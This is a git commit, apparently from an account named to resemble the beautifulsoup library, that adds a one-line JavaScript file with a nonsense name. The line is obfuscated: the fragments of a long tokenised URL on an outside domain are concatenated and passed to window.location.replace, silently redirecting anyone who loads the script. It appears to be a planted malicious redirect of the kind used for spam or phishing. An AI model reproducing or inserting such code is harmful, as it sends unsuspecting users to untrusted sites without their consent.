62e5d3e55890234211db9626415a8eb3fc171d61
beautifulsoupz <77855946+crossrevicerszedorton@users.noreply.github.com>
2023-01-28 18:30:26 +0100

    Create ghjhgkglghlkhhgjhgfjffhtydhjdfjhdchdcf.js

---
+++ ghjhgkglghlkhhgjhgfjffhtydhjdfjhdchdcf.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`htt`,`ps://www.r`,`oadsworks`,`.com/V0p0ljJ`,`EcXBBoh1`,`Zf2-7c_o2-H`,`Nu60ZotOFsh2`,`r0AKrfQM9l`,`2962BugYspO8`,`HIW-mkHZ`,`dlrIaSRJ`,`GBW6`,`Snl9og~~`))
